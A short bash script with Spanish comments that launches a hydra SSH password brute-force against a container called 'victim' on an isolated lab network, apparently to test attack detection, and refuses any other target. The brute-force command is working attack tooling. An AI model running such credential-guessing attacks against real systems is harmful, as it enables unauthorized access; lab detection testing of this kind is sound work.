#!/usr/bin/env bash
# Fuerza bruta SSH contra la víctima del LAB, con fines de prueba de detección.
set -euo pipefail

TARGET="${TARGET:-victim}"

# Guardarraíl de seguridad: este script solo apunta al contenedor del lab.
if [[ "$TARGET" != "victim" ]]; then
    echo "[!] Por seguridad solo se permite TARGET=victim (red aislada del lab)." >&2
    exit 1
fi

echo "[*] Lanzando fuerza bruta contra ${TARGET} (red attack_net, aislada)"
hydra -L /opt/users.txt -P /opt/passwords.txt -t 4 -f "ssh://${TARGET}"
